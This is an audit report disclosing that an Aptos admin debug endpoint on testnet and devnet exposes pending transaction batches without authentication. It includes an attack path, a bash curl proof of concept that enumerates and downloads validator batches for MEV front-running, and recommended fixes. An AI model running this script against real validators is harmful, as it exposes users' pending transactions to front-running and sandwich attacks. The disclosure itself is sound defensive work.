# Audit Report

## Title
Unauthenticated Quorum Store Batch Enumeration Enables MEV on Non-Mainnet Networks

## Summary
The admin service endpoint `/debug/consensus/quorumstoredb` exposes pending transaction batches without authentication on testnet/devnet networks, allowing attackers to enumerate and retrieve full transaction details before they are committed to the blockchain, enabling MEV attacks.

## Finding Description

The `dump_quorum_store_db()` function in the admin service provides two modes of operation: [1](#0-0) 

When called without parameters, it enumerates all batch digests. When called with a specific digest, it retrieves the full `PersistedValue<BatchInfo>` which contains the `maybe_payload` field: [2](#0-1) 

This payload field contains `Vec<SignedTransaction>` which includes complete transaction details: [3](#0-2) 

On testnet/devnet networks, the admin service is enabled by default with no authentication: [4](#0-3) 

The authentication bypass occurs when `authentication_configs` is empty: [5](#0-4) 

The service listens on all interfaces (0.0.0.0:9102), making it accessible to external attackers if not firewalled.

**Attack Path:**
1. Attacker identifies testnet/devnet validator nodes with port 9102 accessible
2. `GET http://<validator-ip>:9102/debug/consensus/quorumstoredb` → returns all batch digests
3. For each digest: `GET http://<validator-ip>:9102/debug/consensus/quorumstoredb?digest=<hash>` → returns full transaction data in Debug format
4. Attacker extracts transaction payloads, senders, gas prices, and function arguments
5. Attacker front-runs high-value transactions or executes sandwich attacks

## Impact Explanation

**Severity: High (with caveats)**

This vulnerability enables MEV attacks by exposing pending transactions before blockchain commitment. Attackers can:
- Front-run DEX swaps and liquidations
- Sandwich attack user transactions
- Copy profitable trading strategies
- Manipulate NFT mint timing

However, the impact is limited to non-mainnet networks:
- **Testnet/Devnet**: High impact - no authentication required
- **Mainnet**: Limited impact - service disabled by default and requires authentication when enabled [6](#0-5) 

The vulnerability qualifies as High severity under "Significant protocol violations" due to the systematic exposure of pending transaction data designed to be private until consensus finalization.

## Likelihood Explanation

**Likelihood: Medium on testnet/devnet, Low on mainnet**

On testnet/devnet:
- Admin service enabled by default
- No authentication required by default
- Service listens on all interfaces
- Port may be accessible if not properly firewalled
- Attack requires only HTTP GET requests

On mainnet:
- Admin service disabled by default
- Authentication required if enabled
- Requires operator misconfiguration to be exploitable

The likelihood is reduced because:
- Not all batches have payloads stored (depends on quota management)
- Batches expire and are deleted relatively quickly
- Attacker can only see one validator's batches at a time
- Requires network access to admin port

## Recommendation

**1. Disable batch enumeration in production contexts:**

Remove the batch enumeration capability from `dump_quorum_store_db()`:

```rust
fn dump_quorum_store_db(
    quorum_store_db: &dyn QuorumStoreStorage,
    digest: Option<HashValue>,
) -> anyhow::Result<String> {
    let mut body = String::new();

    if let Some(digest) = digest {
        body.push_str(&format!("{digest:?}:\n"));
        body.push_str(&format!(
            "{:?}",
            quorum_store_db.get_batch(&digest).map_err(Error::msg)?
        ));
    } else {
        // Remove enumeration capability
        return Err(anyhow::anyhow!("Batch digest parameter required"));
    }

    Ok(body)
}
```

**2. Sanitize transaction payloads in debug output:**

Modify the Debug output to exclude sensitive transaction payloads, showing only metadata.

**3. Enforce authentication on all networks:** [7](#0-6) 

Modify the sanitizer to require authentication on all networks, not just mainnet.

**4. Bind to localhost by default:**

Change the default address from "0.0.0.0" to "127.0.0.1" to prevent external access.

## Proof of Concept

```bash
#!/bin/bash
# PoC: Enumerate and extract pending transactions from testnet validator

VALIDATOR_IP="<testnet-validator-ip>"
ADMIN_PORT="9102"

# Step 1: Enumerate all batch digests
echo "[*] Enumerating batch digests..."
curl -s "http://${VALIDATOR_IP}:${ADMIN_PORT}/debug/consensus/quorumstoredb" \
  | grep -oP 'HashValue\([0-9a-f]{64}\)' \
  | cut -d'(' -f2 | cut -d')' -f1 > digests.txt

echo "[+] Found $(wc -l < digests.txt) batches"

# Step 2: Retrieve full batch data for each digest
echo "[*] Retrieving batch contents..."
while read digest; do
    echo "[*] Fetching batch: $digest"
    curl -s "http://${VALIDATOR_IP}:${ADMIN_PORT}/debug/consensus/quorumstoredb?digest=$digest" \
      > "batch_${digest:0:8}.txt"
    
    # Extract transaction details (sender, payload)
    grep -A 20 "SignedTransaction" "batch_${digest:0:8}.txt" || true
done < digests.txt

echo "[+] Complete. Extracted pending transactions for MEV analysis."
```

**Expected Output:**
- List of all pending batch digests
- Full transaction details including sender addresses, payloads, gas prices
- Information sufficient to construct front-running transactions

**Notes:**
- This vulnerability exists by design in the admin service debugging functionality
- The security model relies on authentication and network isolation, which are not enforced on testnet/devnet by default
- Validators should firewall port 9102 and enable authentication even on test networks
- Consider whether debug endpoints should expose such sensitive operational data

### Citations

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L158-177)
```rust
fn dump_quorum_store_db(
    quorum_store_db: &dyn QuorumStoreStorage,
    digest: Option<HashValue>,
) -> anyhow::Result<String> {
    let mut body = String::new();

    if let Some(digest) = digest {
        body.push_str(&format!("{digest:?}:\n"));
        body.push_str(&format!(
            "{:?}",
            quorum_store_db.get_batch(&digest).map_err(Error::msg)?
        ));
    } else {
        for (digest, _batch) in quorum_store_db.get_all_batches()? {
            body.push_str(&format!("{digest:?}:\n"));
        }
    }

    Ok(body)
}
```

**File:** consensus/src/quorum_store/types.rs (L21-25)
```rust
#[derive(Clone, Eq, Deserialize, Serialize, PartialEq, Debug)]
pub struct PersistedValue<T> {
    info: T,
    maybe_payload: Option<Vec<SignedTransaction>>,
}
```

**File:** types/src/transaction/mod.rs (L1037-1041)
```rust
#[derive(Clone, Eq, Serialize, Deserialize)]
pub struct SignedTransaction {
    /// The raw transaction
    raw_txn: RawTransaction,

```

**File:** config/src/config/admin_service_config.rs (L41-50)
```rust
impl Default for AdminServiceConfig {
    fn default() -> Self {
        Self {
            enabled: None,
            address: "0.0.0.0".to_string(),
            port: 9102,
            authentication_configs: vec![],
            malloc_stats_max_len: 2 * 1024 * 1024,
        }
    }
```

**File:** config/src/config/admin_service_config.rs (L59-82)
```rust
impl ConfigSanitizer for AdminServiceConfig {
    fn sanitize(
        node_config: &NodeConfig,
        _node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        let sanitizer_name = Self::get_sanitizer_name();

        if node_config.admin_service.enabled == Some(true) {
            if let Some(chain_id) = chain_id {
                if chain_id.is_mainnet()
                    && node_config.admin_service.authentication_configs.is_empty()
                {
                    return Err(Error::ConfigSanitizerFailed(
                        sanitizer_name,
                        "Must enable authentication for AdminService on mainnet.".into(),
                    ));
                }
            }
        }

        Ok(())
    }
}
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L154-156)
```rust
        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
```
